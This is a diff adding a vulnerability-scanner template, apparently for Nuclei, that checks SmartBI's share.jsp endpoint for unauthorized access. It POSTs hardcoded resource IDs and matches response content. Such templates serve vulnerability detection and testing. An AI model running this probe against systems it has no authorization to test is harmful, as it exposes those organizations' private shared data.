@@ -1,0 +1,31 @@
+id: smartbi-share-session
+info:
+  name: SmartBI share.jsp 接口 - 未授权访问漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: smartbi
+    product: smartbi
+  tags: unauth,vuln,smartbi
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/vision/share.jsp'
+    redirects: true
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: resid={{value}}
+    payloads:
+      value:
+        - 96a0a9d0b86f90d5416d013f4cfe2f23
+        - Iff808081017e7bff7bff1888017e8108eeec09bb
+        - b904ab9f5a84712a672523a7b4881ee4
+        - c9c298ba657587c42cba00490b5b07a9
+        - Iff808081017ee2a0e2a05606017ee66b4a312301
+    attack: batteringram
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "openresource.jsp") && contains(body, ''shareContent'')'
